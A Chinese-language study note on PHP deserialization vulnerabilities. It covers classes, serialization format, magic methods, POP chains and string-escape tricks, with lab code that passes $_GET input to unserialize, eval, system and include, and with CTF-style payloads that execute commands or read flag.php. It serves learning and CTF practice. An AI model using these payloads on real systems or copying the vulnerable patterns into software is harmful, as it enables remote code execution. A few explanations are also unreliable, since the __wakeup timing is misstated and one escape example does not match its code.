2023/10/28

## PHP反序列化

###### php面向对象

程序开发 : 面向对象(看结果)  面向过程(看过程)

###### 类的定义

类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。对象是具有类型的变量，是对类的实例。
**内部构成： 成员变量（属性） + 成员函数（方法）**
**继承：继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系。**

**0x01 类的结构**
类：定义类名、定义成员变量（属性）、定义成员函数（方法）

```php
class Class_Name {
    //成员变量声明
    //成员函数声明
}
```

创建一个类：

```php
<?php
class hero  //定义类(类名)                  
{
    var $name = 'shabi';    //声明成员变量
    var $sex;   //var为一种修饰符
    function jineng($var1)  //声明成员方法
    {
        echo $this->name;   //使用预定义$this调用成员变量
        echo '释放了技能' . $var1 . '。';   //成员方法传参$var1可以直接调用
        echo "<br>";    //换行
    }
}
```

```php
$cyj = new hero();	//实例化对象
$cyj->name = 'dashabi';
$cyj->sex = '男';
$cyj->jineng(var1:'跳跳跳');
print_r($cyj);
?>
```



**0x02 类的修饰符**																						   类的子类

![image-20231028110635088](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231028110635088.png)

```php
-0x001
<?php
highlight_file(__FILE__);
class hero{
  public  $name='chengyaojin';	//公有的
  private  $sex='man';	//私有的
  protected  $shengao='165';	//受保护的 内部、子类可以用
  function jineng($var1) {
    echo $this->name;
    echo $var1;
    }
}
$cyj= new hero();
echo $cyj->name."<br />"; 	//外部可用
echo $cyj->sex."<br />";	//外部不可用
echo $cyj->shengao."<br />";	//外部不可用
?>
```

```php
-0x002
<?php
highlight_file(__FILE__);
class hero{
  public  $name='chengyaojin';	//定义公有方法
  private  $sex='man';	//定义私有方法
  protected  $shengao='165';	//定义受保护的方法
  function jineng($var1) {
    echo $this->name;
    echo $var1;
    }
}
class hero2 extends hero{  //extends 继承
    function test(){
    echo $this->name."<br />";	//公有方法类的内部、子类和外部都可以使用
    echo $this->sex."<br />";	//私有方法 只有类的内部可以调用 子类和外部都不能调用
    echo $this->shengao."<br />";	//受保护的方法 类的内部和子类可以调用
    }
}
$cyj= new hero();
$cyj2=new hero2();
echo $cyj->name."<br />"; //公有方法类的内部、子类和外部都可以使用
echo $cyj2->test();
?>
所以很明显的 name可以输出 然后是输出hero2的成员方法 但是sex是private 子类不能调用 所以sex不会被输出
```

```php
输出结果:
chengyaojin
chengyaojin
Notice: Undefined property: hero2::$sex in /var/www/html/class03/4.php on line 15
165
```


**0x03 ** 序列化
序列化 (Serialization) 	是将对象的状态信息（属性）转换为可以存储或传输的形式的过程。
对象  —序列化— >  字符串

 数组序列化![image-20231028145809281](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231028145809281.png)



对象序列化

```php
<?php
    highlight_file(__FILE__);
class test{
    public $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
$a = new test();
echo serialize($a);
?>
```

```php
O:4:"test":1:{s:3:"pub";s:6:"benben";}
O(Object):4(类名长度):"test"(类名):1(成员属性):{s(string):3(字符串长度):"pub"(成员名字);(重复)}
```

private私有属性序列化: `O:4:"test":1:{s:9:"testpub";s:6:"benben";}` 在变量名前加%00  -> %00变量%00
%00test%00pub
protect受保护属性序列化:`O:4:"test":1:{s:6:"*pub";s:6:"benben";}` 在变量名前加`%00*%00`
``%00*%00pub`

**0x04 反序列化**

1.反序列化后的内容是一个对象；
**2 .反序列化生成的对象里的值，由反序列化里的值提供；与原有类定义的值无关**
3.反序列化不触发类的成员方法；需要调用方法后才能触发;

**反序列化的作用**
将序列化后的参数还原成实例化的对象

 ![image-20231028154458950](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231028154458950.png) 



**0x05 反序列化漏洞**

2 .反序列化生成的对象里的值，由反序列化里的**值**提供；与原有类定义的值无关

所以这就构成了反序列化漏洞的成因: 反序列化过程中,unserialize()接收的值(字符串)可控; 可以通过这个值（字符串），得到所需要的代码，即生成的对象的属性值 

**反序列化例题：**

```php
class test{
    public $a = 'echo "this is test!!";';
    public function displayVar() {
        eval($this->a); //把$a传递给eval()函数运行 
    }
}
$get = $_GET["benben"];	//GET方式拿到benben的值
$b = unserialize($get);	//对benben的值进行反序列化
$b->displayVar() ;	    //调用反序列化后的
```

所以我们先做对象的序列化:

```php
O:4:"test":1:{s:1:"a";s:22:"echo "this is test!!";";}
```

然后下面是通过GET方式拿到benben的值 然后再赋值给$b 做反序列化在调用成员方法 **所以GET方式拿到的benben的值我们是可控的** 写payload:

```shell
$get = 'O:4:"test":1:{s:1:"a";s:15:"system("ls%20/");";}'
注意 这边的%20是URL编码作为空格输入的 编码后只占一个字符
```

所以最终payload:

```shell
?benben=O:4:"test":1:{s:1:"a";s:15:"system("ls%20/");";}
```

输出: bin boot core dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var



**0x06 魔术方法**

一个预定义好的 在特定情况下自动触发的行为方法
(做完一件事情自动触发做下一件事情)


**0x001**
 __construct() : 实例化对象时触发构造函数

```php
class User {
    public $username;
    public function __construct($username) {
        $this->username = $username;
        echo "触发了构造函数1次" ;
    }
}
$test = new User("benben");  //实例化对象时出发了__construct(构造)函数
$ser = serialize($test);
unserialize($ser);

触发了构造函数1次
```



**0x002**
__destruct() ：在对象的所有应用被删除（销毁）时执行的魔术方法

**对象的销毁:**
显试销毁: 当对象没有被引用时就会被销毁,所以我们可以unset或为其赋值NULL
隐试销毁:PHP是脚本语言,在代码执行完最后一行时,所有申请的内存都要释放掉.

```php
class User {
    public function __destruct()
    {
        echo "触发了析构函数1次"."<br />" ;
    }
}
$test = new User("benben"); //实例化对象完后会销毁 调用__destruct
$ser = serialize($test);
unserialize($ser);	//释放内存删除所有应用 调用__destruct

触发了析构函数1次
触发了析构函数1次
```

构析函数例题:

```php
class User {
    var $cmd = "echo 'dazhuang666!!';" ;
    public function __destruct()
    {
        eval ($this->cmd);
    }
}
$ser = $_GET["benben"];
unserialize($ser);
```

很熟悉的destruct()的反序列化 在php最后一句反序列化话中会调用destruct()函数 所以我们直接构造payload

```shell
?benben=O:4:"User":1:{s:3:"cmd";s:13:"system("ls");";}

.1.php 2.php 3.php
```



**0x003**
__sleep()：在序列化之前会被触发

```php
class User {
    const SITE = 'uusama';
    public $username;
    public $nickname;
    private $password;
    public function __construct($username, $nickname, $password)    {
        $this->username = $username;
        $this->nickname = $nickname;
        $this->password = $password;
    }
    public function __sleep() { 
        return array('username', 'nickname');
    }
}
$user = new User('a', 'b', 'c');	//先调用__construct 赋值a,b,c进去
echo serialize($user);	//在序列化之前调用__sleep 只返回两个值给user 再序列化user

O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}
```

__sleep() 例题:

```php
class User {
    const SITE = 'uusama';
    public $username;
    public $nickname;
    private $password;
    public function __construct($username, $nickname, $password)    {
        $this->username = $username;
        $this->nickname = $nickname;
        $this->password = $password;
    }
    public function __sleep() {
        system($this->username);	
    }
}
$cmd = $_GET['benben'];	//GET拿到benbe=
$user = new User($cmd, 'b', 'c');	//调用__construct函数 payload,b,c分别赋值
echo unserialize($user);	//反序列化前调用__sleep函数 只返回给user username然后反序列化
//注意这边是system()函数 而且不是反序列化 所以可以直接GET传参 相当于一句话木马

?benben=ls
1.php 2.php 3.php 4.php N;
```



**0x004**
__wakeup()：和`__sleep`一样 区别在与 `__sleep`在**序列化前**调用 而`__wakeup`是在**反序列化前**调用

```php
class User {
    const SITE = 'uusama';
    public $username;
    public $nickname;
    private $password;
    private $order;
    public function __wakeup() {
        $this->password = $this->username;
    }
}
$user_ser = 'O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}';
var_dump(unserialize($user_ser)); //反序列化后调用__wakeup函数 把username的a赋值给了paswword 所以var_dump的时候会["password":"User":private]=> string(1) "a" 而不是NULL

object(User)#1 (4) { ["username"]=> string(1) "a" ["nickname"]=> string(1) "b" ["password":"User":private]=> string(1) "a" ["order":"User":private]=> NULL }
```



__wakeup()例题

```php
class User {
    const SITE = 'uusama';
    public $username;
    public $nickname;
    private $password;
    private $order;
    public function __wakeup() {
        system($this->username);
    }
}
$user_ser = $_GET['benben'];
unserialize($user_ser);
很简单的__wakeup()函数 反序列化后调用system() 把GET赋值给username PAYLOAD:
O:4:"User":1:{s:8:"username";s:2:"ls";}

1.php 2.php 3.php 4.php
```



**0x005**
__toString()：表达方式错误导致魔术方法触发 **把对象当做字符串输出的时候会被触发**

```php
class User {
    var $benben = "this is test!!";
         public function __toString()
         {
             return '格式不对，输出不了!';
          }
}
$test = new User() ;	//实例化对象User给变量$test
print_r($test);		//print_r 或者 var_dump可以正常输出对象 
echo "<br />";	//换行
echo $test; 	//如果对象被当做string echo了 那就会调用__toString()

User Object ( [benben] => this is test!! ) //print_r($test);	
格式不对，输出不了!
```



**0x006**
__invoke()：和`__toString()`大同小异  格式表达错误到时魔术方法触发 **把对象当成函数调用的时候** 会被触发

```php
class User {
    var $benben = "this is test!!";
         public function __invoke()
         {
             echo  '它不是个函数!';
          }
}
$test = new User() ; //实例化对象
echo $test ->benben; //echo string 没问题可以输出
echo "<br />"; //换行
echo $test() ->benben; //echo $test() 注意这里加了括号 就是函数 函数是不能被echo的 所以会触发__invoke函数

this is test!!	//echo $test ->benben;
它不是个函数!
```

自己搭的实例(验证):

![image-20231028195456988](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231028195456988.png)



 **0x007**
__call()：调用一个不存在的方法

```php
class User {
    public function __call($arg1,$arg2)
    {
        echo "$arg1,$arg2[0]";
          }
}
$test = new User() ;
$test -> callxxx('a'); //调用一个不存在的成员方法 __call函数会拿到两个参数:

callxxx,a
    
$arg1 是用户输入的那个不存在的成员方法名字 
$arg2 是成员方法里的值
```



**0x008**
__callStatic()：静态调用或调用成员常亮时使用的方法不存在 和`__call()`大同小异  只是调用的方法不一样 

```php
class User {
    public function __callStatic($arg1,$arg2)
    {
        echo "$arg1,$arg2[0]";
          }
}
$test = new User() ;
$test::callxxx('a');

callxxx,a
```



**0x009**
__get()：调用的成员属性不存在

```php
class User {
    public $var1;
    public function __get($arg1)
    {
        echo  $arg1;
    }
}
$test = new User() ;
$test ->var2; //调用一个不存在成员属性 会执行__get()函数 回显用户输入的不存在的成员方法

var2
```



**0x010**
__set()：给不存在的成员属性赋值

```php
class User {
    public $var1;
    public function __set($arg1 ,$arg2)
    {
        echo  $arg1.','.$arg2;
    }
}
$test = new User() ;
$test ->var2=1; //给成员方法var2赋值1 成员属性var2不存在 所以调用__set()函数 返回两个值

var2,1
```



**0x011**
__isset()：对不可访问属性使用isset()或empty()时 `__isset()`会被触发

```php
class User {
    private $var; //私有属性 只能在类的内部调用
    public function __isset($arg1 )
    {
        echo  $arg1;
    }
}
$test = new User() ;
isset($test->var); //在外部调用私有属性 所以var不存在或不能被调用 所以会调用__isset函数 返回值

var
```



**0x012**
__unset()：对不可访问属性使用unset()时 `__unset()`会被触发

```php
class User {
    private $var;
    public function __unset($arg1 )
    {
        echo  $arg1;
    }
}
$test = new User() ;
unset($test->var); //var是私有成员属性 在外部不可调用 所以调用了__unset函数 返回值

var
```



**0x013**
__clone()：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法`__clone()`

```php
class User {
    private $var;
    public function __clone( )
    {
        echo  "__clone test";
          }
}
$test = new User() ;
$newclass = clone($test) //对$test这个对象进行clone的时候 会自动调用__clone()函数     echo __clone test
    
__clone test
```



**魔术方法函数总结**

![image-20231029113908628](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231029113908628.png)



**0x07 POP链**

**0x001**
POP链导引

反序列化例题:

```php
//代码解析
class index { //定义类
    private $test;	//私有成员变量$test
    public function __construct(){ //构造函数时调用此函数
        $this->test = new normal();	//实例化了一个类
    }
    public function __destruct(){	//反序列化时调用此函数			
        $this->test->action();		//调用了上面实例化的normal中的action成员方法
    }
}
class normal {	//定义类
    public function action(){	//定义成员方法
        echo "please attack me";	//echo
    }
}
class evil {	//定义类
    var $test2;	//定义成员变量$test2						 
    public function action(){	//定义成员方法
        eval($this->test2);    	//使用eval函数执行$this->test2的内容			
    }
}
unserialize($_GET['test']);  //从GET中拿到payload 然后反序列化
```

所以大致的解题思路:
![image-20231028220345842](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231028220345842.png)

![image-20231028220502682](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231028220502682.png)

```php
O:5:"index":1:{s:11:"indextest";O:4:"evil":1:{s:5:"test2";s:13:"system('ls');";}}
注意这里的s:11:"indextest"; 是private 所以要加%00 
```

PAYLOAD:

```php
?test=O:5:"index":1:{s:11:"%00index%00test";O:4:"evil":1:{s:5:"test2";s:13:"system(%27ls%27);";}}

1.php
```



**魔术方法触发前提**
魔术方法**所在的类（或对象）被调用**

实例:

```php
//目标 ： echo "tostring is here!!";
class fast {
    public $source;
    public function __wakeup(){	//序列化后调用
        echo "wakeup is here!!";
        echo  $this->source;
    }
}
class sec {
    var $benben;
    public function __tostring(){	//对象被当做字符串输出的时候调用
        echo "tostring is here!!";
    }
}
$b = $_GET['benben'];
unserialize($b);
```

```php
//先简单分析一下代码
要执行的代码 ： echo "tostring is here!!"; 那就要调用 __tostring()函数
__tostring()函数是对象被当做字符串输出的时候调用 所以往上找到 echo  $this->source;
必要条件是__tostring()的触发必须是要调用当前对象才行 所以很容易就想到了把sec实例化给fast 然后让__wakeup()函数调用后， echo sce这个对象 ；
让__tostring()调用  echo "tostring is here!!";
```

```php
//开始解题
实例化fast $a = new fast(); 
实例化sec $b = new sec();
因为唯一可以触发__tostring()函数的地方在echo  $this->source; 所以只能给source赋值成对象sec;
$a->source = $b;
最后echo下serialize后的$b 拿到payload
```

```php
?benben=O:4:"fast":1:{s:6:"source";O:3:"sec":1:{s:6:"benben";N;}}

wakeup is here!!tostring is here!!
```

![image-20231029125857216](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231029125857216.png)



**0x002**
PoC编写

POP链
在反序列化中 我们能够控制的数据就是对象中的属性值（**成员变量**），所以在PHP反序列化中有一种漏洞利用方法叫“**面向对象编程**” 即 **POP (Property Oriented Programming).**
POP链**就是利用魔术方法在里面进行**多次跳转** 然后获取**敏感数据**的一种payload

POC编写
**POC** (Proof of concenpt) **概念验证**  可以被理解成漏洞验证程序 PoC是一段不完整的程序 仅仅是为了可以证明提出者的观点的一段代码

**POP链例题:**

```php
<?php
    //flag is in flag.php
    highlight_file(__FILE__);
error_reporting(0);
class Modifier {
    private $var;
    public function append($value)
    {
        include($value);
        echo $flag;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
?>
```

![image-20231029133706210](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231029133706210.png)

```php
//使用倒推法解析代码 （自己的理解）
先阅读一遍代码 删除一些不必要代码
    public function __construct(){
    $this->p = array();
}
__construct() 是实例化对象的时候会被执行 这里我们用不到这段代码;

找到我们的目标 这里的 echo $flag; 我们很感兴趣
因为echo的是一个变量 变量又被包含在了 $value 中
    public function append($value)
{
    include($value);
    echo $flag;
} 
代码开始前有一段注释告诉了我们 flag 在 flag.php 这个文件中 //flag is in flag.php 
所以我们要做的就是给 $value 赋值为 flag.php 然后 include($value) 最后 echo $flag     
继续倒推 要include就要调用append函数 要调用append函数就要调用
    public function __invoke(){
    $this->append($this->var); //这一段代码是调用了append()函数 var作为值传递           
} 	//(var=flag.php)
__invoke()触发方式为 ： 对象当做函数调用时会被调用
从头到尾看一遍 只有一个地方可以触发函数 那就是 return $function();
class Test{
    public $p;
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
因为 $function = $this->p; 然后return $function , 那么p就必须要等于 Modifier (遵守魔术方法被调用的前提)
才能够触发__invoke()函数 	// ($p = Modifier(对象))
那现在的目标就是调用__get()函数 __get()调用方法: 调用一个不存在的成员属性 //这里先放一下 我们先解释第二段代码
class Show{ 
    public $source;
    public $str;
    public function __toString(){ 
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}
__toString() : 对象被当做字符串输出的时候被调用;
__wakeup() : 反序列化前被调用;

我们要调用__get()函数 就要想办法调用Test这个对象里不存在的那个成员属性 所以我们可以把重点放在
return $this->str->source; 这段代码上 思路是把 str 赋值对象Test 就变成了
return $this->OBJ Test->source; 返回一个Test对象中的source这个成员属性 但是Test中没有source这个成员属性 所以__get()函数就会被调用  () 	//($str = Test(对象))
继续反推 只剩最后一个魔术方法了 __wakeup() : 在反序列化前被调用,
echo $this->source; 这里可以做什么?联想到上一段代码 __toString()函数:对象被当做字符串输出的时候被调用
那我们是不是就可以把$source赋值成一个对象 然后被echo 导致__toString()函数被触发？  //($source=Show(对象))

//整体理一遍思路
反序列化前 调用__wakeup() 给$source赋值成obj Show 调用了__toString()
给$str赋值成obj Test 然后返回了一个Test中不存在的成员属性source 调用了Test中的 __get()
给$p赋值成obj Modifier 就会调用Modifier中的__invoke()
__invoke()中又调用了append($value)这个function , 那么我们就要在$this->append($this->var)中动手脚
给var赋值成flag.php 然后被传参进append() include()后输出flag.php中的flag
```

![image-20231029142642235](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231029142642235.png)

```php
echo serialize($show); //PoC结果
O:4:"Show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:13:"Modifiervar";s:8:"flag.php";}}}
//注意这里的var是私有属性 所以构造最终payload的时候要在Modifier两边加%00
```

PAYLOAD

```php
?pop=O:4:"Show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:13:"%00Modifier%00var";s:8:"flag.php";}}}

ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}
```



**0x08 字符串逃逸**

**字符串逃逸基础**
![image-20231029143158498](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231029143158498.png)

![image-20231029143203227](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231029143203227.png)

成员属性数量一致
成员属性名称长度一致
内容长度一致
![image-20231029152423185](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231029152423185.png)

;} 由前面的s:5 来决定几个字符 从而决定是不是功能性字符

字符串逃逸减少例题:

```php
class A{
    public $v1 = "abcsystem()system()system()";
    public $v2 = '123';

    public function __construct($arga,$argc){
            $this->v1 = $arga;
            $this->v2 = $argc;
    }
}
$a = $_GET['v1'];
$b = $_GET['v2'];
$data = serialize(new A($a,$b));
$data = str_replace("system()","",$ data);
var_dump(unserialize($data));
```

```php
//PoC 可以去掉一些没用的代码
class A{
    public $v1 = "abcsystem()";
    public $v2 = '123';;
    }
}
$data = serialize(new A($a,$b));

O:1:"A":2:{s:2:"v1";s:11:"abcsystem()";s:2:"v2";s:3:"123";}
拿到最初序列化后的代码
```

因为`$data = str_replace("system()","",$ data);`有这一段代码 所以所有的system() 关键字都会被替换成空字符
system()被替换了 值得注意的是前面的字符数量没有改变

```php
s:11:"abcsystem()";
s:11:"abc";
差了6个字符 所以不会反序列化不会成功
```

O:1:"A":2:{s:2:"v1";s:11:"**abc";s:2:"v**2";s:3:"123";}   

所以我们可以利用这点来构造一条语句 先尝试闭合
O:1:"A":2:{s:2:"v1";s:27:"**abc";s:2:"v2";s:21:"1234567**";s:2:"v3";N;}"}
这样子刚好可以造成引号里的被闭合了 并且和前面的字符数量对上 ( 3*8 + 3 )

继续优化代码就成了这样
O:1:"A":2:{s:2:"v1";s:27:"**abc";s:2:"v2";s:28:"1234567**";s:2:"v3";s:2:"SB";}";}

v1 : abcsystem()system()system()
v2 : 1234567";s:2:"v3";s:2:"SB";}";}
就完成了我们的PAYLOAD

字符串逃逸增加例题:

```php
class A{
    public $v1 = "abcsystem()system()system()";
    public $v2 = '123';

    public function __construct($arga,$argc){
        $this->v1 = $arga;
        $this->v2 = $argc;
    }
}
$a = $_GET['v1'];
$b = $_GET['v2'];
$data = serialize(new A($a,$b));
$data = str_replace("system()","",$data);
var_dump(unserialize($data));
```

```php
//优化代码
class A{
    public $v1 = 'ls';
    public $v2 = '123';
}
$data =  serialize(new A());
echo(serialize($data));
先拿到原代码序列化后的数据
O:1:"A":2:{s:2:"v1";s:2:"ls";s:2:"v2";s:3:"123";}
```

因为ls会被replace成pwd 所以
s:49:"O:1:"A":2:{s:2:"v1";s:**2**:"**pwd**";s:2:"v2";s:3:"123";}"; 就变成了这样 不匹配 多吐出了一个字符
思路:把吐出来的字符构造成功能性代码
例 : 新增v3 : 666
";s:2:"v3";s:3:"666";}  (22)
ls -> pwd 是多一位字符 所以我们需要构造22个ls来确保刚好卡在"前 并且后面的数据全都包括进去
O:1:"A":2:{s:2:"v1";s:66:"lslslslslslslslslslslslslslslslslslslslslsls";s:2:"v3";s:3:"666";}";s:2:"v2";s:3:"123";}

s:66:"**lslslslslslslslslslslslslslslslslslslslslsls";s:2:"v3";s:3:"666";}**" 
lslslslslslslslslslslslslslslslslslslslslsls  (44)
";s:2:"v3";s:3:"666";}							(22)
这样子因为;}已经闭合了 所以后面的就不会执行了
最终PAYLOAD:

```php
?v1=lslslslslslslslslslslslslslslslslslslslslsls";s:2:"v3";s:3:"666";}
```

